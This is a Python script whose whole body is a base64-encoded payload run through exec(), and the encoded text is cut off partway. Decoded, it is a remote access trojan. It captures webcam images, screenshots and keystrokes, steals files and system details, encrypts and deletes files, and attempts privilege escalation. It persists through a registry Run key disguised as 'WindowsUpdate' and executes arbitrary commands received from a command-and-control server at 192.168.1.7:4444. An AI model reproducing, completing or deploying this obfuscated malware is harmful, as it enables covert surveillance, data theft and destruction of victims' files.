import base64
exec(base64.b64decode('aW1wb3J0IHNvY2tldAppbXBvcnQgd2FybmluZ3MKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IG9zCmltcG9ydCBzeXMKaW1wb3J0IHRpbWUKaW1wb3J0IHBsYXRmb3JtCmltcG9ydCBnZXRwYXNzCmltcG9ydCB1dWlkCmltcG9ydCBqc29uCmltcG9ydCB3aW5yZWcKaW1wb3J0IGN0eXBlcwppbXBvcnQgcHN1dGlsCmltcG9ydCBjdjIKaW1wb3J0IHB5YXV0b2d1aQpmcm9tIHRocmVhZGluZyBpbXBvcnQgVGhyZWFkCmZyb20gcHlucHV0IGltcG9ydCBrZXlib2FyZAppbXBvcnQgaGFzaGxpYgppbXBvcnQgc2h1dGlsCgpjbGFzcyBWaWN0aW1Db250cm9sOgogICAgd2ViY2FtX2NvdW50ID0gMAogICAgc2NyZWVuc2hvdF9jb3VudCA9IDAKICAgIGtleWxvZ2dlcl9ydW5uaW5nID0gRmFsc2UKICAgIGtleWxvZ2dlcl90aHJlYWQgPSBOb25lCiAgICBrZXlfYnVmZmVyID0gW10KCiAgICBAc3RhdGljbWV0aG9kCiAgICBkZWYgZ2V0X2Z1bGxfaW5mbygpOgogICAgICAgIGluZm8gPSB7CiAgICAgICAgICAgICJob3N0bmFtZSI6IHBsYXRmb3JtLm5vZGUoKSwKICAgICAgICAgICAgInVzZXJuYW1lIjogZ2V0cGFzcy5nZXR1c2VyKCksCiAgICAgICAgICAgICJvcyI6IHBsYXRmb3JtLnBsYXRmb3JtKCksCiAgICAgICAgICAgICJjcHUiOiB7CiAgICAgICAgICAgICAgICAiY29yZXMiOiBwc3V0aWwuY3B1X2NvdW50KCksCiAgICAgICAgICAgICAgICAidXNhZ2UiOiBwc3V0aWwuY3B1X3BlcmNlbnQoaW50ZXJ2YWw9MSkKICAgICAgICAgICAgfSwKICAgICAgICAgICAgInJhbSI6IHBzdXRpbC52aXJ0dWFsX21lbW9yeSgpLl9hc2RpY3QoKSwKICAgICAgICAgICAgImRpc2tzIjogW3BzdXRpbC5kaXNrX3VzYWdlKHBhcnQubW91bnRwb2ludCkuX2FzZGljdCgpIAogICAgICAgICAgICAgICAgICAgICBmb3IgcGFydCBpbiBwc3V0aWwuZGlza19wYXJ0aXRpb25zKCkgaWYgcGFydC5tb3VudHBvaW50XSwKICAgICAgICAgICAgImlwIjogc29ja2V0LmdldGhvc3RieW5hbWUoc29ja2V0LmdldGhvc3RuYW1lKCkpLAogICAgICAgICAgICAibWFjIjogJzonLmpvaW4oWyd7OjAyeH0nLmZvcm1hdCgodXVpZC5nZXRub2RlKCkgPj4gZWxlKSAmIDB4ZmYpIAogICAgICAgICAgICAgICAgICBmb3IgZWxlIGluIHJhbmdlKDAsOCo2LDgpXVs6Oi0xXSksCiAgICAgICAgICAgICJwcm9jZXNzZXMiOiBbcC5uYW1lKCkgZm9yIHAgaW4gcHN1dGlsLnByb2Nlc3NfaXRlcigpXVs6NTBdCiAgICAgICAgfQoKICAgICAgICB0cnk6CiAgICAgICAgICAgIHNvZnR3YXJlID0gW10KICAgICAgICAgICAgd2l0aCB3aW5yZWcuT3BlbktleSh3aW5yZWcuSEtFWV9MT0NBTF9NQUNISU5FLCAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgciJTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGwiKSBhcyBrZXk6CiAgICAgICAgICAgICAgICBmb3IgaSBpbiByYW5nZSh3aW5yZWcuUXVlcnlJbmZvS2V5KGtleSlbMF0pOgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgc3Via2V5ID0gd2lucmVnLkVudW1LZXkoa2V5LCBpKQogICAgICAgICAgICAgICAgICAgICAgICB3aXRoIHdpbnJlZy5PcGVuS2V5KGtleSwgc3Via2V5KSBhcyBzdWJrZXlfaXRlbToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUgPSB3aW5yZWcuUXVlcnlWYWx1ZUV4KHN1YmtleV9pdGVtLCAiRGlzcGxheU5hbWUiKVswXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmVyc2lvbiA9IHdpbnJlZy5RdWVyeVZhbHVlRXgoc3Via2V5X2l0ZW0sICJEaXNwbGF5VmVyc2lvbiIpWzBdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzb2Z0d2FyZS5hcHBlbmQoZiJ7bmFtZX0gKHt2ZXJzaW9ufSkiKQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgaW5mb1sic29mdHdhcmUiXSA9IHNvZnR3YXJlCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBpbmZvWyJzb2Z0d2FyZSJdID0gWyJDb3VsZCBub3QgcmVhZCByZWdpc3RyeSJdCgogICAgICAgIHJlY2VudCA9IFtdCiAgICAgICAgZm9yIGZvbGRlciBpbiBbIkRlc2t0b3AiLCAiRG9jdW1lbnRzIiwgIkRvd25sb2FkcyJdOgogICAgICAgICAgICBwYXRoID0gb3MucGF0aC5qb2luKG9zLnBhdGguZXhwYW5kdXNlcigifiIpLCBmb2xkZXIpCiAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKHBhdGgpOgogICAgICAgICAgICAgICAgcmVjZW50LmV4dGVuZChbZiBmb3IgZiBpbiBvcy5saXN0ZGlyKHBhdGgpWzoyMF0gaWYgbm90IGYuc3RhcnRzd2l0aCgnLicpXSkKICAgICAgICBpbmZvWyJyZWNlbnRfZmlsZXMiXSA9IHJlY2VudAoKICAgICAgICByZXR1cm4gaW5mbwoKICAgIEBzdGF0aWNtZXRob2QKICAgIGRlZiB3ZWJjYW1fc25hcHNob3QoKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIFZpY3RpbUNvbnRyb2wud2ViY2FtX2NvdW50ICs9IDEKICAgICAgICAgICAgY2FtID0gY3YyLlZpZGVvQ2FwdHVyZSgwKQogICAgICAgICAgICByZXQsIGZyYW1lID0gY2FtLnJlYWQoKQogICAgICAgICAgICBpZiByZXQ6CiAgICAgICAgICAgICAgICBmaWxlbmFtZSA9IGYid2ViY2FtX3tWaWN0aW1Db250cm9sLndlYmNhbV9jb3VudH0uanBnIgogICAgICAgICAgICAgICAgY3YyLmltd3JpdGUoZmlsZW5hbWUsIGZyYW1lKQogICAgICAgICAgICAgICAgd2l0aCBvcGVuKGZpbGVuYW1lLCAicmIiKSBhcyBmOgogICAgICAgICAgICAgICAgICAgIGRhdGEgPSBiYXNlNjQuYjY0ZW5jb2RlKGYucmVhZCgpKS5kZWNvZGUoKQogICAgICAgICAgICAgICAgb3MucmVtb3ZlKGZpbGVuYW1lKQogICAgICAgICAgICAgICAgcmV0dXJuIGRhdGEKICAgICAgICAgICAgY2FtLnJlbGVhc2UoKQogICAgICAgICAgICByZXR1cm4gTm9uZQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcmV0dXJuIGYiV2ViY2FtIGVycm9yOiB7c3RyKGUpfSIKCiAgICBAc3RhdGljbWV0aG9kCiAgICBkZWYgdGFrZV9zY3JlZW5zaG90KCk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBWaWN0aW1Db250cm9sLnNjcmVlbnNob3RfY291bnQgKz0gMQogICAgICAgICAgICBmaWxlbmFtZSA9IGYic2NyZWVuX3tWaWN0aW1Db250cm9sLnNjcmVlbnNob3RfY291bnR9LnBuZyIKICAgICAgICAgICAgcHlhdXRvZ3VpLnNjcmVlbnNob3QoZmlsZW5hbWUpCiAgICAgICAgICAgIHdpdGggb3BlbihmaWxlbmFtZSwgInJiIikgYXMgZjoKICAgICAgICAgICAgICAgIGRhdGEgPSBiYXNlNjQuYjY0ZW5jb2RlKGYucmVhZCgpKS5kZWNvZGUoKQogICAgICAgICAgICBvcy5yZW1vdmUoZmlsZW5hbWUpCiAgICAgICAgICAgIHJldHVybiBkYXRhCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICByZXR1cm4gZiJTY3JlZW5zaG90IGVycm9yOiB7c3RyKGUpfSIKCiAgICBAc3RhdGljbWV0aG9kCiAgICBkZWYgYXV0b19kb3dubG9hZCgpOgogICAgICAgIGRvd25sb2FkZWQgPSBbXQogICAgICAgIGZvciBmb2xkZXIgaW4gWyJEZXNrdG9wIiwgIkRvY3VtZW50cyIsICJEb3dubG9hZHMiXToKICAgICAgICAgICAgcGF0aCA9IG9zLnBhdGguam9pbihvcy5wYXRoLmV4cGFuZHVzZXIoIn4iKSwgZm9sZGVyKQogICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhwYXRoKToKICAgICAgICAgICAgICAgIGZvciBmaWxlIGluIG9zLmxpc3RkaXIocGF0aClbOjEwXToKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVwYXRoID0gb3MucGF0aC5qb2luKHBhdGgsIGZpbGUpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguaXNmaWxlKGZpbGVwYXRoKSBhbmQgb3MucGF0aC5nZXRzaXplKGZpbGVwYXRoKSA8IDUwMDAwMDA6ICAjIDVNQiBsaW1pdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKGZpbGVwYXRoLCAicmIiKSBhcyBmOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvd25sb2FkZWQuYXBwZW5kKHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiBmaWxlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiY29udGVudCI6IGJhc2U2NC5iNjRlbmNvZGUoZi5yZWFkKCkpLmRlY29kZSgpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAic2l6ZSI6IG9zLnBhdGguZ2V0c2l6ZShmaWxlcGF0aCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICByZXR1cm4gZG93bmxvYWRlZAoKICAgIEBzdGF0aWNtZXRob2QKICAgIGRlZiBlbmNyeXB0X2ZpbGUocGF0aCk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB3aXRoIG9wZW4ocGF0aCwgInJiIikgYXMgZjoKICAgICAgICAgICAgICAgIGRhdGEgPSBmLnJlYWQoKQogICAgICAgICAgICBrZXkgPSBoYXNobGliLnNoYTI1NihiIm1hbHdhcmUiKS5kaWdlc3QoKQogICAgICAgICAgICBlbmNyeXB0ZWQgPSBieXRlYXJyYXkoKQogICAgICAgICAgICBmb3IgaSBpbiByYW5nZShsZW4oZGF0YSkpOgogICAgICAgICAgICAgICAgZW5jcnlwdGVkLmFwcGVuZChkYXRhW2ldIF4ga2V5W2kgJSBsZW4oa2V5KV0pCiAgICAgICAgICAgIHdpdGggb3BlbihwYXRoICsgIi5lbmMiLCAid2IiKSBhcyBmOgogICAgICAgICAgICAgICAgZi53cml0ZShlbmNyeXB0ZWQpCiAgICAgICAgICAgIG9zLnJlbW92ZShwYXRoKQogICAgICAgICAgICByZXR1cm4gZiJFbmNyeXB0ZWQge3BhdGh9IgogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcmV0dXJuIGYiRmFpbGVkIHRvIGVuY3J5cHQge3BhdGh9OiB7c3RyKGUpfSIKCiAgICBAc3RhdGljbWV0aG9kCiAgICBkZWYgdGVybWluYXRlX3Byb2Nlc3MocHJvY2Vzc19uYW1lKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGZvciBwcm9jIGluIHBzdXRpbC5wcm9jZXNzX2l0ZXIoWyduYW1lJ10pOgogICAgICAgICAgICAgICAgaWYgcHJvYy5pbmZvWyduYW1lJ10ubG93ZXIoKSA9PSBwcm9jZXNzX25hbWUubG93ZXIoKToKICAgICAgICAgICAgICAgICAgICBwcm9jLnRlcm1pbmF0ZSgpCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGYiVGVybWluYXRlZCB7cHJvY2Vzc19uYW1lfSIKICAgICAgICAgICAgcmV0dXJuIGYiUHJvY2VzcyB7cHJvY2Vzc19uYW1lfSBub3QgZm91bmQiCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICByZXR1cm4gZiJGYWlsZWQgdG8gdGVybWluYXRlIHtwcm9jZXNzX25hbWV9OiB7c3RyKGUpfSIKCiAgICBAc3RhdGljbWV0aG9kCiAgICBkZWYgZXNjYWxhdGVfcHJpdmlsZWdlcygpOgogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgY3R5cGVzLndpbmRsbC5zaGVsbDMyLklzVXNlckFuQWRtaW4oKToKICAgICAgICAgICAgICAgIHJldHVybiAiQWxyZWFkeSBydW5uaW5nIGFzIGFkbWluIgogICAgICAgICAgICBjdHlwZXMud2luZGxsLnNoZWxsMzIuU2hlbGxFeGVjdXRlVyhOb25lLCAicnVuYXMiLCBzeXMuZXhlY3V0YWJsZSwgIiAiLmpvaW4oc3lzLmFyZ3YpLCBOb25lLCAxKQogICAgICAgICAgICByZXR1cm4gIlByaXZpbGVnZSBlc2NhbGF0aW9uIGF0dGVtcHRlZCIKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHJldHVybiBmIlByaXZpbGVnZSBlc2NhbGF0aW9uIGZhaWxlZDoge3N0cihlKX0iCgogICAgQGNsYXNzbWV0aG9kCiAgICBkZWYga2V5bG9nZ2VyX2xvb3AoY2xzKToKICAgICAgICBkZWYgb25fcHJlc3Moa2V5KToKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgY2hhciA9IGtleS5jaGFyIGlmIGhhc2F0dHIoa2V5LCAnY2hhcicpIGVsc2UgZiJbe2tleX1dIgogICAgICAgICAgICAgICAgY2xzLmtleV9idWZmZXIuYXBwZW5kKGNoYXIpCiAgICAgICAgICAgICAgICBpZiBsZW4oY2xzLmtleV9idWZmZXIpID49IDEwOgogICAgICAgICAgICAgICAgICAgIHdpdGggb3Blbigia2V5bG9nLnR4dCIsICJhIiwgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjoKICAgICAgICAgICAgICAgICAgICAgICAgZi53cml0ZSgiIi5qb2luKGNscy5rZXlfYnVmZmVyKSArICJcbiIpCiAgICAgICAgICAgICAgICAgICAgY2xzLmtleV9idWZmZXIgPSBbXQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwYXNzCgogICAgICAgIHdpdGgga2V5Ym9hcmQuTGlzdGVuZXIob25fcHJlc3M9b25fcHJlc3MpIGFzIGxpc3RlbmVyOgogICAgICAgICAgICB3aGlsZSBjbHMua2V5bG9nZ2VyX3J1bm5pbmc6CiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDAuMSkKICAgICAgICAgICAgbGlzdGVuZXIuc3RvcCgpCgogICAgQGNsYXNzbWV0aG9kCiAgICBkZWYgc3RhcnRfa2V5bG9nZ2VyKGNscyk6CiAgICAgICAgaWYgbm90IGNscy5rZXlsb2dnZXJfcnVubmluZzoKICAgICAgICAgICAgY2xzLmtleWxvZ2dlcl9ydW5uaW5nID0gVHJ1ZQogICAgICAgICAgICBjbHMua2V5bG9nZ2VyX3RocmVhZCA9IFRocmVhZCh0YXJnZXQ9Y2xzLmtleWxvZ2dlcl9sb29wLCBkYWVtb249VHJ1ZSkKICAgICAgICAgICAgY2xzLmtleWxvZ2dlcl90aHJlYWQuc3RhcnQoKQogICAgICAgICAgICBzYXZlX2xvZygiWytdIEtleWxvZ2dlciBzdGFydGVkIikKICAgICAgICAgICAgcmV0dXJuICJLZXlsb2dnZXIgc3RhcnRlZCIKICAgICAgICByZXR1cm4gIktleWxvZ2dlciBhbHJlYWR5IHJ1bm5pbmciCgogICAgQGNsYXNzbWV0aG9kCiAgICBkZWYgc3RvcF9rZXlsb2dnZXIoY2xzKToKICAgICAgICBpZiBjbHMua2V5bG9nZ2VyX3J1bm5pbmc6CiAgICAgICAgICAgIGNscy5rZXlsb2dnZXJfcnVubmluZyA9IEZhbHNlCiAgICAgICAgICAgIGlmIGNscy5rZXlsb2dnZXJfdGhyZWFkOgogICAgICAgICAgICAgICAgY2xzLmtleWxvZ2dlcl90aHJlYWQuam9pbih0aW1lb3V0PTEpCiAgICAgICAgICAgIGNscy5rZXlsb2dnZXJfdGhyZWFkID0gTm9uZQogICAgICAgICAgICBzYXZlX2xvZygiWytdIEtleWxvZ2dlciBzdG9wcGVkIikKICAgICAgICAgICAgcmV0dXJuICJLZXlsb2dnZXIgc3RvcHBlZCIKICAgICAgICByZXR1cm4gIktleWxvZ2dlciBub3QgcnVubmluZyIKCmRlZiBzYXZlX2xvZyhkYXRhKToKICAgIHRyeToKICAgICAgICB3aXRoIG9wZW4oInZpY3RpbV9kYXRhLnR4dCIsICJhIiwgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjoKICAgICAgICAgICAgZi53cml0ZShkYXRhICsgIlxuIikKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCgpkZWYgaGlkZV9jb25zb2xlKCk6CiAgICB0cnk6CiAgICAgICAgY3R5cGVzLndpbmRsbC51c2VyMzIuU2hvd1dpbmRvdyhjdHlwZXMud2luZGxsLmtlcm5lbDMyLkdldENvbnNvbGVXaW5kb3coKSwgMCkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCgpkZWYgYWRkX3RvX3N0YXJ0dXAoKToKICAgIHRyeToKICAgICAgICBrZXkgPSB3aW5yZWcuSEtFWV9DVVJSRU5UX1VTRVIKICAgICAgICBwYXRoID0gciJTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4iCiAgICAgICAgcmVnX2tleSA9IHdpbnJlZy5PcGVuS2V5KGtleSwgcGF0aCwgMCwgd2lucmVnLktFWV9XUklURSkKICAgICAgICB3aW5yZWcuU2V0VmFsdWVFeChyZWdfa2V5LCAiV2luZG93c1VwZGF0ZSIsIDAsIHdpbnJlZy5SRUdfU1osIHN5cy5leGVjdXRhYmxlKQogICAgICAgIHdpbnJlZy5DbG9zZUtleShyZWdfa2V5KQogICAgICAgIHNhdmVfbG9nKCJbK10gQWRkZWQgdG8gc3RhcnR1cCIpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgc2F2ZV9sb2coZiJbLV0gU3RhcnR1cCBlcnJvcjoge3N0cihlKX0iKQoKZGVmIGhhbmRsZV9jb21tYW5kKHNvY2ssIGNtZCk6CiAgICBpZiBub3QgY21kLnN0cmlwKCk6CiAgICAgICAgcmV0dXJuCgogICAgdHJ5OgogICAgICAgIGlmIGNtZCA9PSAid2ViY2FtIjoKICAgICAgICAgICAgZGF0YSA9IFZpY3RpbUNvbnRyb2wud2ViY2FtX3NuYXBzaG90KCkKICAgICAgICAgICAgc29jay5zZW5kKGRhdGEuZW5jb2RlKCkgaWYgZGF0YSBlbHNlIGIiV2ViY2FtIGVycm9yIikKICAgICAgICAgICAgc2F2ZV9sb2coIlsrXSBXZWJjYW0gc25hcHNob3QgdGFrZW4iKQogICAgICAgIGVsaWYgY21kID09ICJzY3JlZW5zaG90IjoKICAgICAgICAgICAgZGF0YSA9IFZpY3RpbUNvbnRyb2wudGFrZV9zY3JlZW5zaG90KCkKICAgICAgICAgICAgc29jay5zZW5kKGRhdGEuZW5jb2RlKCkgaWYgZGF0YSBlbHNlIGIiU2NyZWVuc2hvdCBlcnJvciIpCiAgICAgICAgICAgIHNhdmVfbG9nKCJbK10gU2NyZWVuc2hvdCB0YWtlbiIpCiAgICAgICAgZWxpZiBjbWQgPT0gInN5c2luZm8iOgogICAgICAgICAgICBkYXRhID0ganNvbi5kdW1wcyhWaWN0aW1Db250cm9sLmdldF9mdWxsX2luZm8oKSwgaW5kZW50PTQpCiAgICAgICAgICAgIHNvY2suc2VuZChkYXRhLmVuY29kZSgpKQogICAgICAgICAgICBzYXZlX2xvZygiWytdIFN5c3RlbSBpbmZvIHNlbnQiKQogICAgICAgIGVsaWYgY21kID09ICJhdXRvZG93bmxvYWQiOgogICAgICAgICAgICBmaWxlcyA9IFZpY3RpbUNvbnRyb2wuYXV0b19kb3dubG9hZCgpCiAgICAgICAgICAgIHNvY2suc2VuZChqc29uLmR1bXBzKGZpbGVzKS5lbmNvZGUoKSkKICAgICAgICAgICAgc2F2ZV9sb2coZiJbK10gRG93bmxvYWRlZCB7bGVuKGZpbGVzKX0gZmlsZXMiKQogICAgICAgIGVsaWYgY21kLnN0YXJ0c3dpdGgoImZpbGVfbGlzdCAiKToKICAgICAgICAgICAgcGF0aCA9IGNtZFs5Ol0uc3RyaXAoKQogICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aCk6CiAgICAgICAgICAgICAgICBzb2NrLnNlbmQoYiJQYXRoIGRvZXMgbm90IGV4aXN0IikKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICBmaWxlcyA9IG9zLmxpc3RkaXIocGF0aCkKICAgICAgICAgICAgc29jay5zZW5kKGpzb24uZHVtcHMoZmlsZXMpLmVuY29kZSgpKQogICAgICAgICAgICBzYXZlX2xvZyhmIlsrXSBMaXN0ZWQgZmlsZXMgaW4ge3BhdGh9IikKICAgICAgICBlbGlmIGNtZC5zdGFydHN3aXRoKCJmaWxlX3JlYWQgIik6CiAgICAgICAgICAgIHBhdGggPSBjbWRbOTpdLnN0cmlwKCkKICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOgogICAgICAgICAgICAgICAgc29jay5zZW5kKGIiRmlsZSBkb2VzIG5vdCBleGlzdCIpCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgaWYgb3MucGF0aC5nZXRzaXplKHBhdGgpID4gNTAwMDAwMDogICMgNU1CIGxpbWl0CiAgICAgICAgICAgICAgICBzb2NrLnNlbmQoYiJGaWxlIHRvbyBsYXJnZSAobWF4IDVNQikiKQogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgIHdpdGggb3BlbihwYXRoLCAicmIiKSBhcyBmOgogICAgICAgICAgICAgICAgY29udGVudCA9IGJhc2U2NC5iNjRlbmNvZGUoZi5yZWFkKCkpLmRlY29kZSgpCiAgICAgICAgICAgICAgICBzb2NrLnNlbmQoY29udGVudC5lbmNvZGUoKSkKICAgICAgICAgICAgICAgIHNhdmVfbG9nKGYiWytdIFJlYWQgZmlsZSB7cGF0aH0iKQogICAgICAgIGVsaWYgY21kLnN0YXJ0c3dpdGgoImVuY3J5cHQgIik6CiAgICAgICAgICAgIHBhdGggPSBjbWRbNzpdLnN0cmlwKCkKICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOgogICAgICAgICAgICAgICAgc29jay5zZW5kKGIiRmlsZSBkb2VzIG5vdCBleGlzdCIpCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgZGF0YSA9IFZpY3RpbUNvbnRyb2wuZW5jcnlwdF9maWxlKHBhdGgpCiAgICAgICAgICAgIHNvY2suc2VuZChkYXRhLmVuY29kZSgpKQogICAgICAgICAgICBzYXZlX2xvZyhmIlsrXSB7ZGF0YX0iKQogICAgICAgIGVsaWYgY21kLnN0YXJ0c3dpdGgoInRlcm1pbmF0ZSAiKToKICAgICAgICAgICAgcHJvY2Vzc19uYW1lID0gY21kWzEwOl0uc3RyaXAoKQogICAgICAgICAgICBkYXRhID0gVmljdGltQ29udHJvbC50ZXJtaW5hdGVfcHJvY2Vzcyhwcm9jZXNzX25hbWUpCiAgICAgICAgICAgIHNvY2suc2VuZChkYXRhLmVuY29kZSgpKQogICAgICAgICAgICBzYXZlX2xvZyhmIlsrXSB7ZGF0YX0iKQogICAgICAgIGVsaWYgY21kID09ICJlc2NhbGF0ZSI6CiAgICAgICAgICAgIGRhdGEgPSBWaWN0aW1Db250cm9sLmVzY2FsYXRlX3ByaXZpbGVnZXMoKQogICAgICAgICAgICBzb2NrLnNlbmQoZGF0YS5lbmNvZGUoKSkKICAgICAgICAgICAgc2F2ZV9sb2coZiJbK10ge2RhdGF9IikKICAgICAgICBlbGlmIGNtZCA9PSAia2V5bG9nZ2VyIHN0YXJ0IjoKICAgICAgICAgICAgZGF0YSA9IFZpY3RpbUNvbnRyb2wuc3RhcnRfa2V5bG9nZ2VyKCkKICAgICAgICAgICAgc29jay5zZW5kKGRhdGEuZW5jb2RlKCkpCiAgICAgICAgZWxpZiBjbWQgPT0gImtleWxvZ2dlciBzdG9wIjoKICAgICAgICAgICAgZGF0YSA9IFZpY3RpbUNvbnRyb2wuc3RvcF9rZXlsb2dnZXIoKQogICAgICAgICAgICBzb2NrLnNlbmQoZGF0YS5lbmNvZGUoKSkKICAgICAgICBlbGlmIGNtZCA9PSAiaGVscCI6CiAgICAgICAgICAgIGhlbHBfdGV4dCA9ICIiIkF2YWlsYWJsZSBjb21tYW5kczoKLSBzeXNpbmZvICAgICAgICAgIC0gR2V0IHN5c3RlbSBpbmZvcm1hdGlvbgotIHNjcmVlbnNob3QgICAgICAgLSBDYXB0dXJlIHNjcmVlbgotIHdlYmNhbSAgICAgICAgICAgLSBUYWtlIHdlYmNhbSBwaG90bwotIGF1dG9kb3dubG9hZCAgICAgLSBHcmFiIGZpbGVzIGZyb20gRGVza3RvcC9Eb2N1bWVudHMvRG93bmxvYWRzCi0gZmlsZV9saXN0IFtwYXRoXSAtIEJyb3dzZSBmaWxlcwotIGZpbGVfcmVhZCBbcGF0aF0gLSBEb3dubG9hZCBhbnkgZmlsZQotIGVuY3J5cHQgW2ZpbGVdICAgLSBFbmNyeXB0IGEgZmlsZSAoc2ltdWxhdGlvbikKLSB0ZXJtaW5hdGUgW3Byb2NdIC0gVGVybWluYXRlIGEgcHJvY2VzcwotIGVzY2FsYXRlICAgICAgICAgLSBBdHRlbXB0IHByaXZpbGVnZSBlc2NhbGF0aW9uCi0ga2V5bG9nZ2VyIHN0YXJ0ICAtIFN0YXJ0IGtleWxvZ2dlcgotIGtleWxvZ2dlciBzdG9wICAgLSBTdG9wIGtleWxvZ2dlcgotIGNtZCBbY29tbWFuZF0gICAgLSBFeGVjdXRlIHN5c3RlbSBjb21tYW5kCi0gZXhpdCAgICAgICAgICAgICAtIENsb3NlIGNvbm5lY3Rpb24KLSBoZWxwICAgICAgICAgICAgIC0gU2hvdyB0aGlzIGhlbHAgbWVudSIiIgogICAgICAgICAgICBzb2NrLnNlbmQoaGVscF90ZXh0LmVuY29kZSgpKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIG91dHB1dCA9IHN1YnByb2Nlc3MuZ2V0b3V0cHV0KGNtZCkKICAgICAgICAgICAgc29jay5zZW5kKG91dHB1dC5lbmNvZGUoKSkKICAgICAgICAgICAgc2F2ZV9sb2coZiJbK10gQ29tbWFuZDoge2NtZH1cbntvdXRwdXR9IikKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBzb2NrLnNlbmQoc3RyKGUpLmVuY29kZSgpKQogICAgICAgIHNhdmVfbG9nKGYiWy1dIENvbW1hbmQgZmFpbGVkOiB7Y21kfVxuRXJyb3I6IHtzdHIoZSl9IikKCmRlZiBjb25uZWN0X3RvX2MyKCk6CiAgICB3aGlsZSBUcnVlOgogICAgICAgIHRyeToKICAgICAgICAgICAgcyA9IHNvY2tldC5zb2NrZXQoKQogICAgICAgICAgICBzLnNldHRpbWVvdXQoMzApCiAgICAgICAgICAgIHByaW50KGYiWypdIFRyeWluZyB0byBjb25uZWN0IHRvIDE5Mi4xNjguMS43OjQ0NDQiKSAgIyBEZWJ1ZyBwcmludAogICAgICAgICAgICBzLmNvbm5lY3QoKCIxOTIuMTY4LjEuNyIsIDQ0NDQpKQogICAgICAgICAgICBzLnNldHRpbWVvdXQoTm9uZSkKICAgICAgICAgICAgc2F2ZV9sb2coIlsrXSBDb25uZWN0ZWQgdG8gQzIgc2VydmVyIikKICAgICAgICAgICAgCiAgICAgICAgICAgIHMuc2VuZChqc29uLmR1bXBzKFZpY3RpbUNvbnRyb2wuZ2V0X2Z1bGxfaW5mbygpKS5lbmNvZGUoKSkKICAgICAgICAgICAgCiAgICAgICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgY21kID0gcy5yZWN2KDEwMjQpLmRlY29kZSgpLnN0cmlwKCkKICAgICAgICAgICAgICAgICAgICBpZiBub3QgY21kOgogICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgICAgIGlmIGNtZCA9PSAiZXhpdCI6CiAgICAgICAgICAgICAgICAgICAgICAgIFZpY3RpbUNvbnRyb2wuc3RvcF9rZXlsb2dnZXIoKQogICAgICAgICAgICAgICAgICAgICAgICBzLmNsb3NlKCkKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgICAgICAgICAgaGFuZGxlX2NvbW1hbmQocywgY21kKQogICAgICAgICAgICAgICAgZXhjZXB0IHNvY2tldC50aW1lb3V0OgogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICAgICAgc2F2ZV9sb2coZiJbLV0gQ29tb